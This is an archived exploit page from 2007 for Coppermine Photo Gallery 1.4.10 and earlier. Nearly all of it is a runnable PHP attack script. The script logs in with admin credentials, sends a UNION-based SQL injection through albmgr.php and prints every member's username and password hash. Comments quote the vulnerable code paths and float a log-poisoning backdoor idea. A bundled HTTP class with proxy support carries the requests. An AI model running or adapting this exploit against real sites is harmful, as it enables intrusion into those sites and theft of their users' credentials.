<html><head><title>Coppermine Photo Gallery <= 1.4.10 Remote SQL Injection Exploit</title></head><pre>#!/usr/bin/php
&lt;?php
if($argc &lt; 4)
{
       print &quot;\n---------------------------------------------------------&quot;;
       print &quot;\nAffected.scr..: Coppermine Photo Gallery &lt;= 1.4.10&quot;;
       print &quot;\nPoc.ID........: 19070104&quot;;
       print &quot;\nType..........: SQL Injection&quot;;
       print &quot;\nRisk.level....: Medium&quot;;
       print &quot;\nSrc.download..: coppermine-gallery.net&quot;;
       print &quot;\nPoc.link......: acid-root.new.fr/poc/19070104.txt&quot;;
       print &quot;\nCredits.......: DarkFig&quot;;
       print &quot;\n---------------------------------------------------------&quot;;
       print &quot;\nUsage.........: php xpl.php &lt;url&gt; &lt;adminuser&gt; &lt;adminpass&gt;&quot;;
       print &quot;\nProxyOptions..: &lt;proxhost:proxport&gt; &lt;proxuser:proxpass&gt;&quot;;
       print &quot;\nExample.......: php xpl.php http://c.com/ admin passwd&quot;;
       print &quot;\n---------------------------------------------------------\n&quot;;
       exit(1);
}


/*/
 [0] =&gt; xpl.php         [1] =&gt; http://localhost/cpg1410/
 [2] =&gt; root            [3] =&gt; toor
 [4] =&gt; localhost:8200  [5] =&gt; user:passwd
/*/
$url=$argv[1];$adu=$argv[2];
$adp=$argv[3];$pxs=$argv[4];
$pxa=$argv[5];

$xpl = new phpsploit();
$xpl-&gt;agent(&quot;InternetExploiter&quot;);
$xpl-&gt;cookiejar(1);
$xpl-&gt;allowredirection(1);

print &quot;\nheader&gt; ===============================================&quot;;
print &quot;\nheader&gt; Coppermine Photo Gallery 1.4.10 (SQL Injection)&quot;;
print &quot;\nheader&gt; ===============================================&quot;;

if(!empty($pxs)){
       print &quot;\nstatus&gt; Using a proxy $pxs&quot;;
       $xpl-&gt;proxy($pxs);
}

if(!empty($pxa)){
       print &quot;\nstatus&gt; Basic proxy authentification $pxa&quot;;
       $xpl-&gt;proxyauth($pxa);
}


/*/
 Table prefix.
/*/
print &quot;\nstatus&gt; Searching the version&quot;;
$xpl-&gt;get($url.'include/index.html');
if(preg_match(&quot;#Coppermine version: ([0-9]*\.[0-9]*\.[0-9]*)#&quot;,$xpl-&gt;getcontent(),$matches)) print &quot;\nsploit&gt; Coppermine version &quot;.$matches[1];
else print &quot;\nsploit&gt; Not found&quot;;
$table = !empty($matches[1]) ? 'cpg'.str_replace('.','',$matches[1]).'_users' : 'cpg1410_users';


/*/
 If you have the admin cookie (but not the password),
 replace lines 73=&gt;76 by $xpl-&gt;addcookie('yourcookie');
/*/
print &quot;\nstatus&gt; Trying to get logged in&quot;;
$xpl-&gt;post($url.&quot;login.php?referer=index.php&quot;,&quot;username=$adu&amp;password=$adp&amp;remember_me=1&amp;submitted=Se+Connecter&quot;);
if(!preg_match(&quot;#color:red#&quot;,$xpl-&gt;getcontent())) print &quot;\nsploit&gt; Done&quot;;
else die(&quot;\nstatus&gt; Exploit failed\n&quot;);


/*/
 (usermgr.php)
 =============
 case 'group_alb_access' :
 if (isset($_GET['gid']))  $group_id = $_GET['gid'];
 $sql = &quot;SELECT group_name  FROM [...] WHERE group_id = $group_id [...]&quot;;
 $result = cpg_db_query($sql);

 (db_ecard.php)
 ==============
 $start = isset($_REQUEST['start']) ? $_REQUEST['start'] : '';  [...]
 if (!$start) {$startFrom = '0';}else{$startFrom=$start;}  [...]
 $result = cpg_db_query(&quot;SELECT [...] ORDER BY $sortBy $sortDirection LIMIT $startFrom,$countTo&quot;);

 (albmgr.php)
 ============
 $cat = isset($_GET['cat']) ? ($_GET['cat']) : 0;
 if ($cat == 1) $cat = 0;
 if (GALLERY_ADMIN_MODE) {
 $result = cpg_db_query(&quot;SELECT [...] WHERE category = $cat ORDER BY pos ASC&quot;);

 (filename_to_title())
 =====================
 $albumid = (isset($_POST['albumid'])) ? $_POST['albumid'] : 0;
 $albstr = ($albumid) ? &quot; WHERE aid = $albumid&quot; : ''; [...]
 $result = cpg_db_query(&quot;SELECT * FROM {$CONFIG['TABLE_PICTURES']} $albstr&quot;);

 (del_titles())
 ==============
 $albumid = (isset($_POST['albumid'])) ? $_POST['albumid'] : 0;
 $albstr = ($albumid) ? &quot; WHERE aid = $albumid&quot; : '';
 $result = cpg_db_query(&quot;SELECT * FROM {$CONFIG['TABLE_PICTURES']} $albstr&quot;);
/*/
print &quot;\nstatus&gt; Retrieving all members password&quot;;
$xpl-&gt;get($url.&quot;albmgr.php?cat=-1/**/union/**/select/**/user_name,user_password/**/from/**/$table/*&quot;);
if(preg_match_all(&quot;#&lt;option value=\&quot;album_no=(.*),album_nm='([a-z0-9]{32})'#&quot;,$xpl-&gt;getcontent(),$matches)) print &quot;\nsploit&gt; Done&quot;;
else die(&quot;\nstatus&gt; Exploit failed\n&quot;);

print &quot;\nsploit&gt; +----------------------------------+----------+&quot;;
print &quot;\nsploit&gt; |             PASSWORD             |   USER   |&quot;;
print &quot;\nsploit&gt; +----------------------------------+----------+&quot;;


/*/
 (init.inc.php)
 ==============
 $HTML_SUBST = array('&amp;' =&gt; '&amp;amp;', '&quot;' =&gt; '&amp;quot;', '&lt;' =&gt; '&amp;lt;', '&gt;' =&gt; '&amp;gt;', '%26' =&gt; '&amp;amp;', '%22' =&gt; '&amp;quot;', '%3C' =&gt; '&amp;lt;', '%3E' =&gt; '&amp;gt;','%27' =&gt; '&amp;#39;', &quot;'&quot; =&gt; '&amp;#39;');
 [...]
 if (is_array($_POST)) { // and GET, SERVER, REQUEST...
 foreach ($_POST as $key =&gt; $value) {
 if (!is_array($value))
 $_POST[$key] = strtr(stripslashes($value), $HTML_SUBST);
 if (!in_array($key, $keysToSkip) &amp;&amp; isset($$key)) unset($$key);
 }

 ... that's why we use the html_entity_decode() function.
 I just wanted &lt; for a remote php code execution sploit without admin rights :'(.
 When the admin view the security logs, it include &quot;security.log.php&quot;...

 (security.log.php)
 ==================
 [...]
 if (!defined('IN_COPPERMINE')) die(); ?&gt;

 Denied privileged access to viewlog.php from user Guest at  on January 4, 2007, 2:10 pm
 Failed login attempt with Username: &amp;lt;?php mail(you); [...] fwrite(backdoor.php); [...] /* from IP 127.0.0.1 on Jan 04, 2007 at 01:16 PM
/*/
for($i=0;$i&lt;count($matches[0]);$i++)
{
       print &quot;\nsploit&gt; | &quot;.$matches[2][$i].' | '.html_entity_decode($matches[1][$i]);
       if($i==(count($matches[0])-1)){
       print &quot;\nsploit&gt; +----------------------------------+----------+\n&quot;;
       }
}

class phpsploit {

	/**
	 * This function is called by the get()/post() functions.
	 * You don't have to call it, this is the main function.
	 *
	 * @return $server_response
	 */
	private function sock()
	{
		if(!empty($this-&gt;proxyhost) &amp;&amp; !empty($this-&gt;proxyport)) $socket = fsockopen($this-&gt;proxyhost,$this-&gt;proxyport);
		else $socket = fsockopen($this-&gt;host,$this-&gt;port);
		
		if(!$socket) die(&quot;Error: The host doesn't exist&quot;);
		
		if($this-&gt;method===&quot;get&quot;) $this-&gt;packet = &quot;GET &quot;.$this-&gt;url.&quot; HTTP/1.1\r\n&quot;;
		elseif($this-&gt;method===&quot;post&quot;) $this-&gt;packet = &quot;POST &quot;.$this-&gt;url. &quot; HTTP/1.1\r\n&quot;;
		else die(&quot;Error: Invalid method&quot;);
		
		if(!empty($this-&gt;proxyuser)) $this-&gt;packet .= &quot;Proxy-Authorization: Basic &quot;.base64_encode($this-&gt;proxyuser.&quot;:&quot;.$this-&gt;proxypass).&quot;\r\n&quot;;
		$this-&gt;packet .= &quot;Host: &quot;.$this-&gt;host.&quot;\r\n&quot;;
		
		if(!empty($this-&gt;agent))  $this-&gt;packet .= &quot;User-Agent: &quot;.$this-&gt;agent.&quot;\r\n&quot;;
		if(!empty($this-&gt;header)) $this-&gt;packet .= $this-&gt;header.&quot;\r\n&quot;;
		if(!empty($this-&gt;cookie)) $this-&gt;packet .= &quot;Cookie: &quot;.$this-&gt;cookie.&quot;\r\n&quot;;
		
		$this-&gt;packet .= &quot;Connection: Close\r\n&quot;;
		if($this-&gt;method===&quot;post&quot;)
		{
			$this-&gt;packet .= &quot;Content-Type: application/x-www-form-urlencoded\r\n&quot;;
			$this-&gt;packet .= &quot;Content-Length: &quot;.strlen($this-&gt;data).&quot;\r\n\r\n&quot;;
			$this-&gt;packet .= $this-&gt;data.&quot;\r\n&quot;;
		}
		$this-&gt;packet .= &quot;\r\n&quot;;
		$this-&gt;recv = '';
		
		fputs($socket,$this-&gt;packet);
		while(!feof($socket)) $this-&gt;recv .= fgets($socket);
		fclose($socket);
		
		if($this-&gt;cookiejar) $this-&gt;cookiejar($this-&gt;getheader($this-&gt;recv));
		if($this-&gt;allowredirection) return $this-&gt;allowredirection($this-&gt;recv);
		else return $this-&gt;recv;
	}
	

	/**
	 * This function allows you to add several cookie in the
	 * request. Several methods are supported:
	 * 
	 * $this-&gt;addcookie(&quot;name&quot;,&quot;value&quot;);
	 * or
	 * $this-&gt;addcookie(&quot;name=newvalue&quot;);
	 * or
	 * $this-&gt;addcookie(&quot;othername=overvalue; xx=zz; y=u&quot;);
	 * 
	 * @param string $cookiename
	 * @param string $cookievalue
	 * 
	 */
	public function addcookie($cookn,$cookv='')
	{
		// $this-&gt;addcookie(&quot;name&quot;,&quot;value&quot;); work avec replace
		if(!empty($cookv))
		{
			if($cookv === &quot;deleted&quot;) $cookv=''; // cookiejar(1) &amp;&amp; Set-Cookie: name=delete
			if(!empty($this-&gt;cookie))
			{
			    if(preg_match(&quot;/$cookn=/&quot;,$this-&gt;cookie))
			    {
			    	$this-&gt;cookie = preg_replace(&quot;/$cookn=(\S*);/&quot;,&quot;$cookn=$cookv;&quot;,$this-&gt;cookie);
			    }
			    else
			    {
			    	$this-&gt;cookie .= &quot; &quot;.$cookn.&quot;=&quot;.$cookv.&quot;;&quot;; // &quot; &quot;.
			    }
			}
			else
			{
				$this-&gt;cookie = $cookn.&quot;=&quot;.$cookv.&quot;;&quot;;
			}
		}
		// $this-&gt;addcookie(&quot;name=value; othername=othervalue&quot;);
		else
		{
	    	 if(!empty($this-&gt;cookie))
	    	 {
	    	 	$cookn = preg_replace(&quot;/(.*);$/&quot;,&quot;$1&quot;,$cookn);
	    	 	$cookarr = explode(&quot;;&quot;,str_replace(&quot; &quot;, &quot;&quot;,$cookn));
	    	 	for($i=0;$i&lt;count($cookarr);$i++)
	    	 	{
	    	 		preg_match(&quot;/(\S*)=(\S*)/&quot;,$cookarr[$i],$matches);
	    	 		$cookn = $matches[1];
	    	 		$cookv = $matches[2];
	    	 		$this-&gt;addcookie($cookn,$cookv);
	    	 	}
	    	 }
			 else
			 {
			 	$cookn = ((substr($cookn,(strlen($cookn)-1),1))===&quot;;&quot;) ? $cookn : $cookn.&quot;;&quot;;
			 	$this-&gt;cookie = $cookn;			
			 }
		}
	}
	
	
	/**
	 * This function allows you to add several headers in the
	 * request. Several methods are supported:
	 *
	 * $this-&gt;addheader(&quot;headername&quot;,&quot;headervalue&quot;);
	 * or
	 * $this-&gt;addheader(&quot;headername: headervalue&quot;);
	 *
	 * @param string $headername
	 * @param string $headervalue
	 */
	public function addheader($headern,$headervalue='')
	{
		// $this-&gt;addheader(&quot;name&quot;,&quot;value&quot;);
		if(!empty($headervalue))
		{
			if(!empty($this-&gt;header))
			{
				if(preg_match(&quot;/$headern:/&quot;,$this-&gt;header))
				{
					$this-&gt;header = preg_replace(&quot;/$headern: (\S*)/&quot;,&quot;$headern: $headervalue&quot;,$this-&gt;header);
				}
				else
				{
					$this-&gt;header .= &quot;\r\n&quot;.$headern.&quot;: &quot;.$headervalue;
				}
			}
			else
			{
				$this-&gt;header=$headern.&quot;: &quot;.$headervalue;
			}
		}
		// $this-&gt;addheader(&quot;name: value&quot;);
		else 
		{
			if(!empty($this-&gt;header))
			{
				$headarr = explode(&quot;: &quot;,$headern);
				$headern = $headarr[0];
				$headerv = $headarr[1];
				$this-&gt;addheader($headern,$headerv);
			}
			else
			{
				$this-&gt;header=$headern;
			}
		}
	}
	

	/**
	 * This function allows you to use an http proxy server.
	 * Several methods are supported:
	 * 
	 * $this-&gt;proxy(&quot;proxyip&quot;,&quot;8118&quot;);
	 * or
	 * $this-&gt;proxy(&quot;proxyip:8118&quot;)
	 *
	 * @param string $proxyhost
	 * @param integer $proxyport
	 */
	public function proxy($proxy,$proxyp='')
	{
		// $this-&gt;proxy(&quot;localhost:8118&quot;);
		if(empty($proxyp))
		{
			preg_match(&quot;/^(\S*):(\d+)$/&quot;,$proxy,$proxarr);
			$proxh = $proxarr[1];
			$proxp = $proxarr[2];
			$this-&gt;proxyhost=$proxh;
			$this-&gt;proxyport=$proxp;
		}
		// $this-&gt;proxy(&quot;localhost&quot;,8118);
		else 
		{
			$this-&gt;proxyhost=$proxy;
			$this-&gt;proxyport=intval($proxyp);
		}
		if($this-&gt;proxyport &gt; 65535) die(&quot;Error: Invalid port number&quot;);
	}
	

	/**
	 * This function allows you to use an http proxy server
	 * which requires a basic authentification. Several
	 * methods are supported:
	 * 
	 * $this-&gt;proxyauth(&quot;darkfig&quot;,&quot;dapasswd&quot;);
	 * or
	 * $this-&gt;proxyauth(&quot;darkfig:dapasswd&quot;);
	 *
	 * @param string $proxyuser
	 * @param string $proxypass
	 */
	public function proxyauth($proxyauth,$proxypasse='')
	{
		// $this-&gt;proxyauth(&quot;darkfig:password&quot;);
		if(empty($proxypasse))
		{
			preg_match(&quot;/^(.*):(.*)$/&quot;,$proxyauth,$proxautharr);
			$proxu = $proxautharr[1];
			$proxp = $proxautharr[2];
			$this-&gt;proxyuser=$proxu;
			$this-&gt;proxypass=$proxp;
		}
		// $this-&gt;proxyauth(&quot;darkfig&quot;,&quot;password&quot;);
		else
		{
			$this-&gt;proxyuser=$proxyauth;
			$this-&gt;proxypass=$proxypasse;
		}
	}

	
	/**
	 * This function allows you to set the &quot;User-Agent&quot; header.
	 * Several methods are possible to do that:
	 * 
	 * $this-&gt;agent(&quot;Mozilla Firefox&quot;);
	 * or
	 * $this-&gt;addheader(&quot;User-Agent: Mozilla Firefox&quot;);
	 * or
	 * $this-&gt;addheader(&quot;User-Agent&quot;,&quot;Mozilla Firefox&quot;);
	 * 
	 * @param string $useragent
	 */
	public function agent($useragent)
	{
		$this-&gt;agent=$useragent;
	}

	
	/**
	 * This function returns the header which will be
	 * in the next request.
	 * 
	 * $this-&gt;showheader();
	 *
	 * @return $header
	 */
	public function showheader()
	{
		return $this-&gt;header;
	}

	
	/**
	 * This function returns the cookie which will be
	 * in the next request.
	 * 
	 * $this-&gt;showcookie();
	 *
	 * @return $storedcookies
	 */
	public function showcookie()
	{
		return $this-&gt;cookie;
	}

	
	/**
	 * This function returns the last formed
	 * http request (the http packet).
	 * 
	 * $this-&gt;showlastrequest();
	 * 
	 * @return $last_http_request
	 */
	public function showlastrequest()
	{
		return $this-&gt;packet;
	}
	
	
	/**
	 * This function sends the formed http packet with the
	 * GET method. You can precise the port of the host.
	 * 
	 * $this-&gt;get(&quot;http://localhost&quot;);
	 * $this-&gt;get(&quot;http://localhost:888/xd/tst.php&quot;);
	 * 
	 * @param string $urlwithpath
	 * @return $server_response
	 */
	public function get($url)
	{
		$this-&gt;target($url);
		$this-&gt;method=&quot;get&quot;;
		return $this-&gt;sock();
	}

	
	/**
	 * This function sends the formed http packet with the
	 * POST method. You can precise the port of the host.
	 * 
	 * $this-&gt;post(&quot;http://localhost/index.php&quot;,&quot;admin=1&amp;user=dark&quot;);
	 *
	 * @param string $urlwithpath
	 * @param string $postdata
	 * @return $server_response
	 */	
	public function post($url,$data)
	{
		$this-&gt;target($url);
		$this-&gt;method=&quot;post&quot;;
		$this-&gt;data=$data;
		return $this-&gt;sock();
	}

	
	/**
	 * This function returns the content of the server response
	 * without the headers.
	 * 
	 * $this-&gt;getcontent($this-&gt;get(&quot;http://localhost/&quot;));
	 * or
	 * $this-&gt;getcontent();
	 *
	 * @param string $server_response
	 * @return $onlythecontent
	 */
	public function getcontent($code='')
	{
		if(empty($code)) $code = $this-&gt;recv;
		$content = explode(&quot;\n&quot;,$code);
		$onlycode = '';
		for($i=1;$i&lt;count($content);$i++)
		{
			if(!preg_match(&quot;/^(\S*):/&quot;,$content[$i])) $ok = 1;
			if($ok) $onlycode .= $content[$i].&quot;\n&quot;;
		}
		return $onlycode;
	}

	
	/**
	 * This function returns the headers of the server response
	 * without the content.
	 * 
	 * $this-&gt;getheader($this-&gt;post(&quot;http://localhost/x.php&quot;,&quot;x=1&amp;z=2&quot;));
	 * or
	 * $this-&gt;getheader();
	 *
	 * @param string $server_response
	 * @return $onlytheheaders
	 */
	public function getheader($code='')
	{
		if(empty($code)) $code = $this-&gt;recv;
		$header = explode(&quot;\n&quot;,$code);
		$onlyheader = $header[0].&quot;\n&quot;;
		for($i=1;$i&lt;count($header);$i++)
		{
			if(!preg_match(&quot;/^(\S*):/&quot;,$header[$i])) break;
			$onlyheader .= $header[$i].&quot;\n&quot;;
		}
		return $onlyheader;
	}

	
	/**
	 * This function is called by the cookiejar() function.
	 * It adds the value of the &quot;Set-Cookie&quot; header in the &quot;Cookie&quot;
	 * header for the next request. You don't have to call it.
	 * 
	 * @param string $server_response
	 */
	private function getcookie($code)
	{
		$carr = explode(&quot;\n&quot;,str_replace(&quot;\r\n&quot;,&quot;\n&quot;,$code));
		for($z=0;$z&lt;count($carr);$z++)
		{
			if(preg_match(&quot;/set-cookie: (.*)/i&quot;,$carr[$z],$cookarr))
			{
				$cookie[] = preg_replace(&quot;/expires=(.*)(GMT||UTC)(\S*)$/i&quot;,&quot;&quot;,preg_replace(&quot;/path=(.*)/i&quot;,&quot;&quot;,$cookarr[1]));
			}
		}

		for($i=0;$i&lt;count($cookie);$i++)
		{
			preg_match(&quot;/(\S*)=(\S*);/&quot;,$cookie[$i],$matches);
	    	        $cookn = $matches[1];
	    	        $cookv = $matches[2];
	    	        $this-&gt;addcookie($cookn,$cookv);
		}
    }

	
	/**
	 * This function is called by the get()/post() functions.
	 * You don't have to call it.
	 *
	 * @param string $urltarg
	 */
	private function target($urltarg)
	{
		if(!preg_match(&quot;/^http:\/\/(.*)\//&quot;,$urltarg)) $urltarg .= &quot;/&quot;;
		$this-&gt;url=$urltarg;
		
		$array = explode(&quot;/&quot;,str_replace(&quot;http://&quot;,&quot;&quot;,preg_replace(&quot;/:(\d+)/&quot;,&quot;&quot;,$urltarg)));
		$this-&gt;host=$array[0];

		preg_match(&quot;/:(\d+)\//&quot;,$urltarg,$matches);
		$this-&gt;port=empty($matches[1]) ? 80 : $matches[1];
		
		$temp = str_replace(&quot;http://&quot;,&quot;&quot;,preg_replace(&quot;/:(\d+)/&quot;,&quot;&quot;,$urltarg));
		preg_match(&quot;/\/(.*)\//&quot;,$temp,$matches);
		$this-&gt;path=str_replace(&quot;//&quot;,&quot;/&quot;,&quot;/&quot;.$matches[1].&quot;/&quot;);
	
		if($this-&gt;port &gt; 65535) die(&quot;Error: Invalid port number&quot;);
	}
	
	
	/**
	 * If you call this function, the script will
	 * extract all &quot;Set-Cookie&quot; headers values
	 * and it will automatically add them into the &quot;Cookie&quot; header
	 * for all next requests.
	 *
	 * $this-&gt;cookiejar(1); // enabled
	 * $this-&gt;cookiejar(0); // disabled
	 * 
	 */
	public function cookiejar($code)
	{
		if($code===0) $this-&gt;cookiejar='';
		if($code===1) $this-&gt;cookiejar=1;
		else
		{
			$this-&gt;getcookie($code);
		}
	}


	/**
	 * If you call this function, the script will
	 * follow all redirections sent by the server.
	 * 
	 * $this-&gt;allowredirection(1); // enabled
	 * $this-&gt;allowredirection(0); // disabled
	 * 
	 * @return $this-&gt;get($locationresponse)
	 */
	public function allowredirection($code)
	{
		if($code===0) $this-&gt;allowredirection='';
		if($code===1) $this-&gt;allowredirection=1;
		else
		{
			if(preg_match(&quot;/(location|content-location|uri): (.*)/i&quot;,$code,$codearr))
			{
				$location = str_replace(chr(13),'',$codearr[2]);
				if(!eregi(&quot;://&quot;,$location))
				{
					return $this-&gt;get(&quot;http://&quot;.$this-&gt;host.$this-&gt;path.$location);
				}
				else
				{
					return $this-&gt;get($location);
				}
			}
			else
			{
				return $code;
			}
		}
	}
	
	
	/**
	 * This function allows you to reset some parameters:
	 * 
	 * $this-&gt;reset(header); // headers cleaned
	 * $this-&gt;reset(cookie); // cookies cleaned
	 * $this-&gt;reset();       // clean all parameters
	 *
	 * @param string $func
	 */
	public function reset($func='')
	{
		switch($func)
		{
			case &quot;header&quot;:
			$this-&gt;header='';
			break;
			
			case &quot;cookie&quot;:
			$this-&gt;cookie='';
			break;
			
			default:
		        $this-&gt;cookiejar='';
		        $this-&gt;header='';
		        $this-&gt;cookie='';
		        $this-&gt;allowredirection=''; 
		        $this-&gt;agent='';
		        break;
		}
	}
}

?&gt;

# milw0rm.com [2007-01-05]</pre></html>